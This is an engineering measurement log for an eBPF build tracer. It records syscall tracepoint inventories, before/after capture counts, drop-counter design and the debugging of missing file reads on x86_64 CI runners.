# Measurements: syscall tracepoint inventory

Probe: `tracepoint-inventory.sh` in this directory. Re-run it when the
kernel changes; an undocumented interface is one that can move without
notice.

## Run 1 — aarch64, Linux 6.8.0-136-generic

Colima's VM kernel on the development host, 2026-10-29. Not a runner
image: this run answers "do these tracepoints exist and where are their
arguments", not "do they exist on the image the lane draws".

```
kernel: 6.8.0-136-generic aarch64
PRESENT sys_enter_openat   sys_exit_openat
PRESENT sys_enter_openat2  sys_exit_openat2
PRESENT sys_enter_connect  sys_exit_connect
ABSENT  sys_enter_open     sys_exit_open
ABSENT  sys_enter_creat    sys_exit_creat
ABSENT  sys_enter_rename   sys_exit_rename
PRESENT sys_enter_chdir sys_exit_chdir sys_exit_fchdir
PRESENT sys_enter_renameat sys_exit_renameat
PRESENT sys_enter_renameat2 sys_exit_renameat2
```

**Controls.** Two groups in that list are not under test. The m1070
calls (`chdir`, `renameat`, `renameat2`) are attached today and must
read PRESENT — they do, so the probe discriminates rather than printing
PRESENT for everything. And `rename` must read ABSENT on this
architecture, because `waybill-cli/src/trace/loader.rs` already guards
it behind `#[cfg(target_arch = "x86_64")]` — it does, so the probe is
reading this kernel rather than a cached or generic list.

**What it establishes.**

1. `openat` and `openat2` both offer an enter/exit pair here. The pair
   is what the kernel-side join needs: arguments at enter, result at
   exit.
2. `open` and `creat` do not exist on this architecture — arm64 has no
   such syscalls. FR-006's requirement is therefore live, not
   hypothetical, and the per-arch attach must follow the m1070 `rename`
   precedent rather than treating absence as failure.
3. `connect` offers an enter/exit pair, and `uservaddr` sits at offset
   24 — the address family and the address itself come from a
   UAPI-defined `struct sockaddr` in user memory, so capture reads no
   kernel struct layout at all. This is what removes both unstable
   dependencies in the network path at once: the symbol name
   `tcp_v4_connect` and the hardcoded `struct sock` offsets 4 and 12
   that the current kprobe reads.
4. The argument offsets match the constants m1070 already hardcodes
   (`ARG0=16, ARG1=24, ARG2=32, ARG3=40, RET=16`) exactly, on every
   tracepoint printed. The new code reuses those constants rather than
   deriving its own.

**What it does not establish.** Whether `sys_enter_open` and
`sys_enter_creat` exist on x86_64, where the lane runs. They are
expected to, because x86-64 has both syscalls, but that is an
expectation and this probe cannot reach an x86_64 kernel from this
host: a `--platform linux/amd64` container still reports the arm64 host
kernel's tracepoints. T-numbered task in `tasks.md` must run this probe
in the eBPF lane and record run 2 here before the per-arch attach list
is finalised.

## Still to measure

- **Run 2, x86_64 on the runner image.** The open-family presence list
  and the offsets, from the lane itself.
- **The successful-open baseline (SC-001a).** No measurement of
  successful-opens-only exists. The before/after comparison needs one,
  taken on a host where capture is intact, using the same fixture.
- **Ring-buffer event volume before and after (SC-008).** Today's count
  for the fixture build is the ceiling the join must not exceed.

---

## Run 3 — after the change, same host (2026-10-29)

aarch64, Linux 6.8.0-136-generic, image built from the working tree.
Harness exits 0; all probes attach; `completeness: complete` and
`kprobe_attach_failures: []` agree, so the #1252 honesty invariant holds.

| Quantity | Before | After |
|---|---|---|
| File operations | 573 | 102 |
| Distinct read paths (masked) | 109 | 31 |
| Distinct write paths (masked) | 31 | 31 |
| `open_failures_discarded` | — | 599 (203 distinct paths) |
| `ring_buffer_overflows` | 0 | 0 |
| Compiler invocations | 9 (7 rustc) | 9 (7 rustc) |

### SC-001b — every removal is attributable

`diff-sets.py` in this directory, run against the before sets, the after
sets and the discard record:

```
--- READ (masked) ---
  before=109 after=31 removed=78 added=0
  attributable to a failed request : 78
  UNEXPLAINED removals             : 0
--- WRITE (masked) ---
  before=31 after=31 removed=0 added=0
  UNEXPLAINED removals             : 0

SC-001b: PASS — every removal is attributable, nothing was added
```

**78 read entries left the set and all 78 appear by name in the discard
record. Nothing was added. The write set did not change at all.** That
is FR-004 and FR-004a satisfied together: the only thing lost is open
requests that failed.

The counter and the log agree independently — 599 discard events
counted in the kernel, 599 discard records logged in userspace — which
is a consistency check between two mechanisms that could have
disagreed.

### SC-008 — volume

573 → 102 events, so the ceiling is met with a wide margin, and
`ring_buffer_overflows` stays 0. Two reductions compound, as predicted
in research R8: `do_sys_openat2` called `do_filp_open`, so one `openat`
used to submit two events, and failed opens are now discarded in the
kernel instead of being submitted. 599 discards against 102 recorded
events is the size of the second effect.

### R10 / the superset assumption — CONFIRMED on this host

The removal of the kprobes rested on the syscall tracepoints covering
every open the kprobes caught. Zero unexplained removals is that claim
measured: nothing the kprobes saw is missing except requests that
failed. Confirmed on aarch64 6.8; the x86_64 lane must reproduce it
before the assumption is retired generally.

### Two measurement traps, both hit

**The diff is dominated by run-to-run noise unless it is masked.** The
first comparison reported **52 unexplained read removals and 18
additions**, which read as a serious regression. They were rustc's and
cargo's random temp directories: `rmetaTmtspV` in one run and
`rmeta6OxaCo` in the next, `.tmpWRoguS.temp-archive` and
`.tmpwLsqVV.temp-archive`, `targeto3Q2sv` and `targetkpUXvC`. Masking
those four shapes takes the read diff to 78 removed / 0 added and the
write diff to 0 / 0. The masks are in `diff-sets.py`; a new random-name
shape will show up as an unexplained removal paired with a matching
addition, which is the signature to look for before believing a
regression.

**The discard log must be stripped of ANSI escapes before parsing.** The
first extraction matched whole log lines rather than paths, and so
reported "599 distinct discarded paths" when 599 was the event count and
203 the distinct-path count. A count that exactly equals another count
is worth a second look.

### Still owed from the lane

- Run 2 of the inventory on x86_64, and whether `open`/`creat` exist
  there (research R9; the `#[cfg(target_arch = "x86_64")]` block is
  unverified and would be dead code if they do not).
- The same before/after comparison on the x86_64 runner image,
  especially the image where the kprobe failed.
- An IPv6-only connect (SC-007). The fixture build is hermetic and
  makes no network connection at all, so `connections=0` in every run
  here — the IPv6 path is compiled and loaded but has not been observed
  firing.
- SC-003's 30 consecutive default-branch runs.

---

## Run 4 — IPv6, with a control (2026-10-29)

SC-007 asks for a build that connects only over IPv6, verified against a
deliberately IPv6-only case rather than inferred from one that uses both.
The harness now does this with a listener on `::1` inside the container,
so it needs no egress and cannot flake on DNS or a firewall.

| | Result |
|---|---|
| After the change | 1 connection recorded, destination `::1` |
| **Control: the same case on the pre-#1252 binary** | **0 connections recorded** |

The control is what makes the assertion worth having. `tcp_v4_connect` is
reached only by IPv4, so the old capture saw nothing at all for this
build — indistinguishable from an offline build — and a test written
without the control could have passed against code that recorded
connections for an unrelated reason.

The compiler fixture cannot carry this check: it is hermetic and reports
`connections=0` on every run, so the IPv6 path would have shipped
compiled, loaded, attached and never once observed firing.

## Run 5 — the FR-004b fallback, exercised deliberately

A host that attaches the open entry but not its exit can see requests and
not results. FR-004b says capture must degrade to recording requests,
record the gap, and not claim completeness. That branch had never
executed, so `WAYBILL_TRACE_FORCE_REQUEST_ONLY=1` makes it reachable —
SC-005 asks for this verified by making an interface unavailable on
purpose rather than by waiting to observe it.

| | Result |
|---|---|
| Attestation produced | yes — the trace did not abort |
| `kprobe_attach_failures` | `["sys_exit_openat"]` — the gap is named |
| `completeness` | `partial / probe_attach_failed` — does not claim complete |
| `open_failures_discarded` | 0 — correct: nothing is discarded in request mode |
| File operations | 289 |

### The three modes reconcile

This is the check that the model of the defect is right, rather than
merely consistent with the numbers:

| Mode | Operations | What it records |
|---|---|---|
| Pre-#1252 (two kprobes) | 573 | every request, **twice** |
| FR-004b fallback (entry only) | 289 | every request, once |
| #1252 (entry joined to exit) | 102 | every request that succeeded |

573 ≈ 2 × 289 is the duplication research R8 predicted:
`do_sys_openat2` called `do_filp_open`, so one `openat` submitted two
events and the read set hid it because a set deduplicates. 289 → 102 is
the failed requests leaving. Neither number was chosen; both fell out of
the same fixture on the same host, and each mode was reached by a
different mechanism.

---

## Run 2 — x86_64, from the eBPF lane (2026-10-29) — T001 ANSWERED

The lane on PR #1313 was the first x86_64 execution of the `open` and
`creat` programs. It **failed**, and the failure was in this feature's
own code rather than in the kernel.

```
WARN could not attach the sys_exit_open tracepoint: program 'sys_exit_open' not found
WARN could not attach the sys_exit_creat tracepoint: program 'sys_exit_creat' not found
WARN some probes did not attach; capture is a floor, not a total
     failed=["sys_exit_open", "sys_exit_creat"]
completeness: partial  (reason=probe_attach_failed)
Collection done net=6 file=43
FAIL: .../libsafe/src/lib.rs is in no rustc read set (m1070 SC-001)
```

### The cause, in four steps

1. The four `open`/`creat` programs were gated
   `#[cfg(target_arch = "x86_64")]` **on the kernel side**. That crate
   compiles for `bpfel-unknown-none`, so the predicate is false on every
   host and the programs were in the object **nowhere**.
2. The loader's `#[cfg(target_arch = "x86_64")]` evaluates against the
   *host*, so on x86_64 it asked for programs that did not exist —
   `program 'sys_exit_open' not found`, which is aya reporting a missing
   program, not a missing kernel tracepoint.
3. The exit-first attach rule then skipped `sys_enter_open`, as designed.
4. x86_64 routes a real share of opens through `open(2)` rather than
   `openat(2)`, so those opens were never observed: **43 file
   operations against 102 on arm64**, with the fixture's crate roots
   missing from the read set.

`whether the syscall exists` is a property of the kernel a program
attaches to, not of the target it was compiled for. m1070 had this right
for `rename`: the kernel side is unconditional and only the *loader*
gates by host arch. The cfg was added here where the template
deliberately had none.

### Fix, and how it is verified

The arch gate is removed from the kernel side; the loader keeps its
gate, so arm64 still does not attempt an attach for a syscall its kernel
lacks. Verified by listing the object's symbols rather than by observing
an attach, because an attach can only be observed on one architecture at
a time:

```
$ readelf -s waybill-ebpf | grep -E 'sys_(enter|exit)_(open|openat|openat2|creat|connect)'
sys_enter_connect  sys_enter_creat  sys_enter_open   sys_enter_openat
sys_enter_openat2  sys_exit_creat   sys_exit_open    sys_exit_openat
sys_exit_openat2
```

All nine present. arm64 harness re-run after the fix: unchanged — 102
operations, 599 discards, `completeness: complete`,
`kprobe_attach_failures: []`, IPv6 recorded.

### What this says about the earlier claim

The PR described this block as "inference, labelled" and reasoned that
the tracepoints "should be present because those syscalls exist on
x86-64". The reasoning was sound and answered the wrong question: the
syscalls do exist and their tracepoints were available. What was missing
was the program.

**R10's superset assumption was therefore refuted on x86_64 and has now
been repaired rather than confirmed.** It still awaits a clean x86_64
run.

### What worked

The capture reported the gap rather than hiding it. `sys_exit_open`
reached `kprobe_attach_failures[]`, completeness read
`partial / probe_attach_failed`, and the harness named the missing crate
root. Before #1310 this same loss presented as `complete` with an empty
failure list, which is how it survived two releases.

## Run 6 — the #618 instrument on x86_64, and why its number cannot be read yet

First x86_64 lane run carrying the #618 drop counters (job 123780037537,
head `5944173c`). The lane had to be re-run once: the first attempt
(job 123731999178) died in the pre-existing `go install sbomqs` step on
a `proxy.golang.org` stream error, in both the plain and the eBPF
x86_64 lanes, and never reached the harness. A grep for
`event_drop_reasons` on that first log returned zero matches — which is
indistinguishable from a clean capture, and would have been reported as
one if the failing step had not been checked. The same shape as the
`openat`-257 control and the `-i`-less `docker run`.

### What the instrument reported

Two traced builds of the `two_binaries_diverge` fixture:

```
reasons=EventDropCounts { counts: {"kernel_exit_without_request": 1237} }
reasons=EventDropCounts { counts: {"kernel_exit_without_request": 918} }
```

Every other reason zero. No `kernel_path_unreadable`, no
`user_empty_path`, no `user_*` reason at all.

### The prediction this refutes — mine

Before the run I recorded: "if entry events are being lost,
`kernel_exit_without_request` is large." That inference is **not
available**, because of a design decision in this same feature.

The open tracepoints are attached **exit first** (`loader.rs`, and the
comment "Exit first, same rule as openat2 above"). The reason is sound:
an entry attached before its exit would stash requests no exit program
can join, losing successful opens outright. The consequence is that in
the window between attaching `sys_exit_openat` and `sys_enter_openat` —
and again for `openat2`, `open` and `creat` — every open **anywhere on
the machine** exits with no stored request and increments this counter.
The probes are system-wide; the capture is scoped to the build's process
tree in userspace. So the counter aggregates the whole runner's ambient
open traffic across the attach window, and the capture does not.

That explains arm64 reading 0 and x86_64 reading 1237 with no defect in
between: a quiet local container versus a busy CI runner. It also means
the number cannot presently distinguish ambient attach-window orphans
from genuinely lost build entries. A global counter compared against a
process-scoped capture is not evidence.

A second, smaller asymmetry is real but latent: `store_open` returns
early on `!should_trace()` and `finish_open` has no such guard, so the
tracer's own opens orphan their exits. `tracer_pid` is populated
(`loader.rs:112`), so the path is live; the count stays small only
because the tracer is blocked in the ring-buffer drain for the window
and writes the attestation after detach.

### What is independently established

The x86_64 capture really is short, and that does not rest on the
counter:

| | arm64 (passing) | x86_64 (failing) |
|---|---|---|
| file operations | 102 | **29** |
| rustc invocations | 7 | 7 |
| ring_buffer_overflows | 0 | 0 |
| open_failures_discarded | — | 151 |
| unresolved_relative_opens | — | 2 |

All 7 rustc invocations were captured this run — whole invocations did
not vanish, unlike earlier #1185 observations. What is missing is the
contents of their read sets: **not one `.rs` read appears in the entire
recorded operation list.** Every surviving read is an absolute path
under `target/release/deps/`. `completeness` still reads `complete`,
which is the #1185 complaint exactly.

### Mechanisms eliminated for `libsafe/src/lib.rs` specifically

- **m213 kernel noise filter** — not a match. The fixture path
  `/waybill/waybill-cli/tests/fixtures/.../libsafe/src/lib.rs` hits no
  prefix pattern (`/etc/ /proc/ /sys/ /dev/ /lib/ /usr/ /bin/ /var/`)
  and no contains pattern (`/.cache/ /.local/ /fingerp /.finger
  /increme Cargo.to -toolcha .cargo/c Cargo.lo`). Checked against the
  catalog in `waybill-common/src/filter.rs`, not assumed. Note the
  filter does legitimately explain the absence of `Cargo.toml` reads,
  via the `Cargo.to` contains pattern.
- **Ring buffer** — `ring_buffer_overflows: 0`.
- **Failed-open discard** — the harness diagnostic reports "(no discard
  line names it)".
- **Relative-path resolution (m1070)** — would report the open as
  `Unresolved`, and only 2 operations are so flagged, neither of them a
  source file. An unresolvable open still appears; this one does not
  appear at all.

So the event never reached userspace, and no instrumented site claims
it. It is either inside the unattributable 1237, or upstream of every
counter.

### What would make the next run decisive

1. **Scope the orphan counter to the traced process tree**, or carry the
   pid with the drop, so ambient traffic stops being counted against a
   process-scoped capture.
2. **Baseline `EVENT_DROPS` immediately after attach completes** and
   report the delta. The attach-window orphans are expected by design
   and should not be reported as loss at all.
3. **Set `WAYBILL_TRACE_OPEN_DIAG=1` in the harness.** The diagnostic
   already asks for it ("needs WAYBILL_TRACE_OPEN_DIAG=1 above") and
   `OPEN_DIAG` is already written on that env var — this costs nothing
   to switch on and names what happened to each open.

Until (1) and (2) land, `kernel_exit_without_request` should be read as
"not yet attributable", not as evidence either way. The counter that
*is* trustworthy is the set of zeros around it: no path-read failure, no
null path, no userspace drop reason fired on a capture that lost ~70% of
its operations.

## Run 7 — making the counter attributable, and a second failure CI had masked

Three changes, measured on arm64 in the `Dockerfile.ebpf-test` container.

### The two that make `kernel_exit_without_request` mean something

1. **`finish_open` now applies `should_trace()`**, the guard `store_open`
   already had. Without it the filtering was asymmetric: the tracer's own
   opens stored no request at entry and then counted a drop at exit.

2. **`EVENT_DROPS` is baselined after attach completes**, read in
   `scan.rs` between `load_and_attach` returning and the child being
   spawned, so anything it already holds predates the build.
   `merge_kernel_event_drops` reports the delta.

The exit-first attach order is kept. It is correct — an entry program
live before its exit program would stash requests nothing can join,
losing successful opens outright — so the window is a consequence to
subtract, not a bug to fix.

Two decisions, both in the direction of not concealing loss:

- An unreadable baseline slot subtracts **nothing** rather than
  defaulting to zero, because a zero baseline would silently inflate the
  delta by the whole attach window. Over-reporting loss beats hiding it.
- `saturating_sub`, not an assertion. Per-CPU sums read at two instants
  can fall if a CPU comes online between them; that is "nothing since
  attach", not a fault.

Five unit tests cover the arithmetic. The one that matters is
mutation-verified: making `net()` return `now` makes
`baseline_nets_out_what_the_attach_window_already_counted` fail, so the
test exercises the subtraction rather than the plumbing around it.

### The third was already done

`WAYBILL_TRACE_OPEN_DIAG=1` has been set in the harness since #1252
(line 55). The diagnostic's "(needs WAYBILL_TRACE_OPEN_DIAG=1 above)" is
a reminder, which run 6 misread as a complaint. So run 6's "(no discard
line names it)" was already a real negative result: the missing crate
root is genuinely absent from the discarded failed opens, not merely
unlogged. Nothing to change, and the run-6 conclusion is strengthened.

### A second failure, which the first was masking

Running the harness to completion on arm64 surfaced:

```
FAIL: trace_integrity carries keys the pre-m1072 struct did not have (SC-007)
      ["open_failures_discarded"]
```

m1072 SC-007 pins `trace_integrity`'s key set against the **merge-base**
struct, deliberately, so the assertion cannot be circular. #1252 then
added `open_failures_discarded`, which a trace of `cat /etc/hostname`
populates legitimately — the loader probes several paths for libc and
most of those opens fail, which is what the counter is for.

Pre-existing at `5944173c`. CI has never reported it because **the
x86-64 lane exits at the m1070 SC-001 check further up the script and
never reaches this assertion.** One failure hid the other, so "the eBPF
lane is red" was two independent faults:

| | fails on | cause |
|---|---|---|
| m1070 SC-001 | x86-64 only | #1185 — the capture loses the source reads |
| m1072 SC-007 | both; arm64 reaches it first | #1252 added a field SC-007 pins against |

Fixed by naming the two fields this branch adds on purpose
(`open_failures_discarded`, `event_drop_reasons`) rather than widening
the check, so an addition nobody intended still fails.

### The assertion was also weaker than it read

It used `[.] | inside($pre)`. On strings jq's `inside` is substring
containment, so a stray `ring_buffer` key would have passed against
`ring_buffer_overflows`. Now exact membership via `index($k)`, proved
rather than asserted:

```
  ring_buffer_overflows      inside=true  index=true
  open_failures_discarded    inside=true  index=true
  event_drop_reasons         inside=true  index=true
  ring_buffer                inside=true  index=false   <- would have slipped through
  totally_new                inside=false index=false
```

Strictly stricter than before about everything it did not admit on
purpose.

### arm64 after the changes: unchanged

| | before | after |
|---|---|---|
| fixture file operations | 102 | 102 |
| `event_drop_reasons` | absent | absent |
| "capture is a floor" warnings | 0 | 0 |
| #618 control (`kernel_null_path`) | 5 | 5 |
| ring_buffer_overflows | 0 | 0 |
| harness exit | — | 0 (full run) |

Caveat on scope of evidence: in this run `open_failures_discarded`
happened to be absent from the `cat` trace, so the harness did not
re-exercise the SC-007 fix end-to-end. The evidence for that fix is the
predicate table above plus run 6 failing with the key present.

### What the next x86-64 lane run distinguishes

The delta is now attributable, so each outcome says something different:

- **~0** — entry events were never being lost; run 6's 1237 was the
  attach window and tracer self-noise. The loss then sits upstream of
  every instrumented site, which eliminates the whole join mechanism.
- **still large** — entry events are genuinely lost with all probes
  attached, pointing at `PENDING_OPEN` insert failure or the entry
  program not firing for some opens.
- **in between** — compare it against the 73 missing operations
  (102 − 29) to size how much of the shortfall the join accounts for.

## Run 8 — the baseline landed, the number is still not attributable, and a far better lead

x86-64 lane on `51a2c24c`. Two attempts of the same fixture build:

| | attempt 1 | attempt 2 | arm64 |
|---|---|---|---|
| file operations | 91 | 35 | 102 |
| `unresolved_relative_opens` | **56** | 2 | — |
| `open_failures_discarded` | 111 | 248 | 599 |
| `kernel_exit_without_request` | 1113 | 845 | absent |
| rustc invocations | 7 | 7 | 7 |

### The baseline works and is insufficient

It subtracted ~124 and ~73 (1237→1113, 918→845). So the window between
attach completing and the baseline read holds ~100 orphans — which
tells us the ambient open rate on the runner is roughly 100 per few
milliseconds, and therefore that the full attach gap plausibly accounts
for ~1000. The baseline cannot catch those: a syscall that *entered*
during the attach gap *exits* after the baseline read, so it lands in
the delta no matter when the baseline is taken.

Conclusion: `kernel_exit_without_request` still cannot distinguish
ambient traffic from lost build entries. The baseline removed one
component of the artifact, not the artifact. **The missing control is a
trace of a trivial command on the same runner**: if `cat /etc/hostname`
also reports ~1000, the number is ambient. The harness already traces
exactly that for the m213 widen case, but the script exits at the
m1070 SC-001 failure above it, so CI has never reached it. The control
has to move ahead of the fixture build.

### The better lead: a source read that arrived and did not resolve

Attempt 1's recorded operations contain:

```
read UNRESOLVED binaries/safe-only/src/main.rs
```

A source file, **captured**, and unresolved. So these reads are not
uniformly lost — at least some reach userspace and fail to resolve
because the working-directory model did not know the process's cwd.
The other unresolved entries in that run (`nvme0n1`, `ACPI0004:00`,
`block`, `devices`, `259:1`) are ambient udev/systemd opens against a
directory fd, which are legitimately unresolvable and always will be.

That reframes the m1070 SC-001 failure. The check looks for an absolute
path in a rustc read set; an unresolved relative read is present in the
capture but can never match, so the capture can hold the evidence and
still fail the assertion.

56 unresolved in attempt 1 against 2 in attempt 2 is the #1185
nondeterminism, now with a mechanism attached to it rather than a
symptom.

### Why cwd would be unknown

The seed is not missing: `scan.rs` spawns the traced child with an
explicit `current_dir`, precisely so the child performs an observable
`chdir` (m1070 research R2). So the model's ground truth depends on
three events surviving the capture — the root's `sys_enter_chdir` /
`sys_exit_chdir` pair, and a `sched_process_fork` per descendant.

Which gives a single explanation covering every observation: the
capture is lossy on x86-64, and **losing one chdir or fork event
amplifies**. cwd is inherited, so one lost event turns every subsequent
relative read by that process and its children into `Unresolved`. That
is why whole crate roots vanish together, why which root vanishes
varies run to run, and why a busy x86-64 runner fails where a quiet
arm64 container passes.

It also explains why #618 never names it: the lost event is a *chdir or
fork*, not an open, and the drop counters only instrument the open join.

### Two things worth doing, in order

1. **Seed the root's cwd from the tracer's own ground truth.** The
   tracer calls `current_dir()` to build the `Command`; it knows the
   directory and the child pid. Depending on observing the `chdir` it
   itself caused is strictly weaker than recording what it set. This is
   not resolving against a guess (Principle III) — it is the one cwd in
   the system the tracer established rather than inferred. Children
   still inherit through fork events, so this hardens the root only,
   but the root is what poisons everything downstream.
2. **Move a control trace ahead of the fixture build** and print its
   drop reasons and operation count, so `kernel_exit_without_request`
   acquires a baseline measured on the same runner in the same run.

## Run 9 — both of run 8's next steps, measured on arm64

Implemented the two items above and ran the full harness in the
container (`waybill-ebpf-test:1185e`, arm64, Colima). `RUN_EXIT=0`, zero
`FAIL` lines, zero `WARN` lines, `>>> m210 + m212 + m213 + m1072
integration test PASSED`.

### The seed

`CwdTracker::seed(pid, dir)` records a directory the tracer
*established* rather than observed, and `scan.rs` seeds the root before
any event is drained.

It seeds **two** pids, and the second is not redundant. The child's
`sched_process_fork` record names the tracer as its parent, and
`CwdTracker::fork` overwrites unconditionally, so seeding only the child
would have been clobbered straight back to `Unknown` by the very record
the seed exists to stop depending on. With both seeded, either event
surviving is enough and the two agree.

That was found by mutation, not by reading: deleting the tracer seed
from `the_root_fork_inherits_the_seed_rather_than_clobbering_it` makes
it fail with `left: Unresolved`. A single seed would have looked
correct, passed its own test, and changed nothing about #1185.

arm64 still passes m1070 SC-001 with the seed in place. The seed cannot
be shown to fix anything here, because arm64 was already passing — only
the x86-64 lane can show that.

### The control, and what it can and cannot baseline

A trace of `cat /etc/hostname` now runs before the fixture build, on the
same runner in the same run. It asserts only that it *ran* — a floor
measured on a failed run is worse than no floor — and then prints.

First attempt failed: `trace capture` refuses a capture that aggregated
nothing ("no dependency activity observed"), and the only file `cat`
reads is one the m213 System category drops. Fixed with
`--include-system-reads`.

Before using that flag I checked it cannot bias the one number the
control exists to measure, rather than assuming so.
`classify_and_drop_if_noise` is called inside `emit_open`, *after* the
entry/exit join — so a filtered path has already been joined and counted
no drop. The widen flag changes which records reach the ring buffer,
never whether an exit found its entry.

| | control, run 9 | control, run 10 | fixture build (default) |
|---|---|---|---|
| `event_drop_reasons` | `{}` | `{}` | `{}` |
| file operations | 239 | **415** | 108 |
| `unresolved_relative_opens` | 192 | **258** | 5 |

Run 10 re-ran the identical block on the same image minutes later, to
check a relabelling edit. It moved 239 → 415 and 192 → 258 while the
fixture build held at 108 / 5. That is the "not comparable" claim
demonstrated rather than asserted: those two rows track the container's
ambient load, so they are a floor for nothing. `event_drop_reasons` was
`{}` in both, which is the row the control exists for.

**The flag is safe for the drop slots and invalidates the other two
rows.** A bare `cat` reporting 239 operations is not `cat`'s work: the
probes are machine-wide, and m211 clears the userspace pid filter in
command-execute mode (`admitted()` returns true for every pid when
`target_pids` is empty), so with System reads admitted the capture holds
every ambient open in the container. The fixture build's 108 and 5 were
taken with that category filtered. The 239/192 vs 108/5 difference is
the filter, not the build, and the script now says so on each line —
dropping the figures would have been worse, because the next reader
would recompute them and draw the comparison anyway.

I drew that comparison wrongly myself before checking: on seeing 192 I
said attempt 1's 56 unresolved opens were "probably mostly ambient". Not
supported. x86-64's 56 and arm64's 5 were both taken with the System
category **on**, so that gap stands as a real difference between the two
architectures.

### What run 9 did not settle

`event_drop_reasons` is `{}` on **both** arm64 runs, so arm64 has no
orphans to baseline and the control measured a floor of zero against a
build of zero. The question the control was built to answer —
whether x86-64's 1113 is ambient traffic or lost build entries — needs
the x86-64 lane, where the slot is non-empty. The delta table
(`control / fixture / excess`) correctly printed nothing here, which is
the lossless shape.

So: the instrument is in place and verified to fire exactly (the #618
positive control still reports `kernel_null_path = 5` on five forced
`openat(NULL)` calls), and it has nothing to say on this architecture.

## Run 11 — reading the open path instead of the counters, and the drop nobody counted

Run 9 and run 10 left the orphan slot uninterpretable for a reason no
further control can fix, so this run went back to the code rather than
measuring around it.

### The finding

`store_open` in `waybill-ebpf/src/programs/open_syscalls.rs` ended with:

```rust
let _ = PENDING_OPEN.insert(&tid, &pending, 0);
```

`PENDING_OPEN` is a BPF hash map of **4096** entries
(`waybill-ebpf/src/maps.rs`). A full hash map rejects
`bpf_map_update_elem`, and that result was discarded. This was the only
early return in the open path that recorded nothing — every other site
in the module already had a named `EVENT_DROPS` slot.

The consequence is not a missing counter but a missing open: with no
stored request the exit tracepoint has nothing to join, so the open never
reaches a read set. It also increments
`kernel_exit_without_request`, which is why that slot could not be read.
**Two different failures were summing into one number:**

| | cause | consequence |
|---|---|---|
| exit arrived before its entry was ever stored | the map refused the request | the open is **lost** |
| exit arrived for a syscall already in flight | the probes attached late | nothing lost; counting noise |

Subtracting a floor cannot separate those, because a floor is one number
and this is two mechanisms. That — not arm64's quietness — is why runs 9
and 10 could not settle what x86-64's 1113 means.

### Why this matches #1185's symptom better than anything measured so far

These tracepoints are **machine-wide** (`should_trace()` excludes only
the tracer's own pid), so every thread on the host competes for the same
4096 slots. The map's own doc comment claimed the bound was "threads
currently inside an open, not opens", which holds only while every entry
is eventually removed. The exit tracepoint removes one; a thread that
dies inside the syscall does not, and nothing reclaims it for the rest of
the trace.

If occupancy saturates partway through a build, every subsequent open
anywhere on the machine is dropped. That produces loss that is

- **nondeterministic** — it depends on accumulated leakage and on
  whatever else the host was doing;
- **wholesale rather than sampled** — later crates vanish entirely while
  earlier ones look intact, which is the shape #1185 reports;
- **invisible** — the capture still reports itself complete.

This is a hypothesis, not a measurement. What this run adds is the
instrument that can confirm or kill it.

### Ruled out by reading, not by assuming

An entry program live without its exit would leak every entry it stored.
`trace/loader.rs` already prevents it: `openat2`, `open` and `creat`
attach **exit first** and skip the entry on failure, and `openat`'s
entry-first exception has the FR-004b `request_only` fallback, which
emits at entry instead of stashing. So an unpaired entry program is not a
standing leak source. Only `openat`'s own attach window is, and that is
milliseconds.

### What this run changed

1. `kernel_pending_insert_failed` (`EventDropReason` slot 3) counts the
   refused insert at its own site. It double-counts with
   `kernel_exit_without_request` by design: the difference between the
   two is late arrival, and this slot alone is loss the capture caused.
2. `EVENT_DROPS` is now sized from `EventDropReason::KERNEL_SLOTS`
   instead of the literal `3`. `increment_event_drop` reaches its slot
   through `get_ptr_mut`, which returns `None` past the end of the map
   and silently counts nothing — so a variant added without widening the
   map would read zero forever. A counter that cannot see its own
   subject is indistinguishable from a mechanism that never fired, which
   is the ambiguity #618 exists to remove.
3. `pending_open_entries_at_close` reports the map's occupancy at trace
   end. Read as **accumulated leakage, not peak**: entries drain as
   syscalls exit, so what remains are the threads that died inside one.
   A handful means the bound is not the constraint; a figure near 4096
   means saturation is reachable and (1) is what reaching it costs. This
   is the better early-warning instrument, because (1) only fires after
   the damage.
4. A forced-failure control (`WAYBILL_TRACE_FORCE_PENDING_INSERT_FAIL=1`,
   following the existing `WAYBILL_TRACE_FORCE_REQUEST_ONLY` precedent)
   makes the branch reachable, since saturating a 4096-entry machine-wide
   map on demand is not something a test can arrange.

### What the forced control does and does not establish

It establishes that the count reaches the attestation, and that refusing
the request loses the open — the harness asserts the counter is non-zero
and that **zero** operations survive.

It does **not** establish that a genuinely full map returns an error at
this call site. That rests on `bpf_map_update_elem` rejecting an insert
into a full hash map, and only real saturation would confirm it. The
distinction is labelled in the map's doc comment and in the harness
output rather than left to be inferred.

### #1185's honesty defect, now demonstrable on demand

Under the forced flag the capture loses **every** open and still
describes itself the way the harness prints. That is printed, not
asserted: it is the defect #1185 reports rather than a regression this
change introduces, and tightening it into an assertion is the
honest-claim change (T038), not this one.

### Measured, arm64, Colima aarch64 / 2 CPUs / kernel 6.8, image `1185g`

The forced control:

| | |
|---|---|
| `kernel_pending_insert_failed` | **75** |
| `kernel_exit_without_request` | **75** |
| file operations captured | **0** |
| `pending_open_entries_at_close` | 0 |

The counter fires and reaches the attestation; refusing the request loses
**every** open. The two slots came out exactly equal, which is the 1:1
pairing claimed above, measured rather than argued — every refused insert
produced exactly one orphaned exit. Recorded as a finding, not asserted:
a syscall interrupted between entry and exit would break the equality
without anything being wrong, and a brittle assertion that goes red for
that reason teaches people to ignore it.

The fixture build:

| | |
|---|---|
| `pending_open_entries_at_close` | **2**, then **0**, of 4096 |
| `event_drop_reasons` | `{}` |
| file operations | 102 |
| `completeness` | `complete` |

Two runs of the same image, minutes apart: occupancy 2 and then 0. The
forced control reported `kernel_pending_insert_failed: 75` in both, which
is the determinism expected of a fixed command (`rustc --version`) with a
fixed open count — so the 2-vs-0 is the host's leakage varying, not the
instrument.

### This weakens the saturation hypothesis

**2 of 4096, and then 0.** Over an entire fixture build on a machine-wide
probe, the in-flight-open map accumulated two leaked entries, then none. On this host leakage
is not close to being the constraint, and the mechanism proposed above —
leaks accumulating until the map saturates — is not what is happening
here.

Stated as a weakening rather than a refutation, because of what the
number does and does not cover:

- It is one small build on a quiet 2-CPU arm64 VM. x86-64 is where the
  1113 orphans are, and it is a busier host.
- Occupancy at close measures **accumulated leakage**, not peak. A build
  could transiently saturate from genuine concurrency and drain before
  close; 2 at close does not exclude that. What it does make unlikely is
  the specific leak-accumulation path.

So arm64 now has neither orphans (`{}`) nor leakage (2), and still cannot
discriminate between the two mechanisms — for the same structural reason
run 9 could not, with one more slot established as silent.

### What the x86-64 lane now answers

Sharper than before, and without needing a control at all:

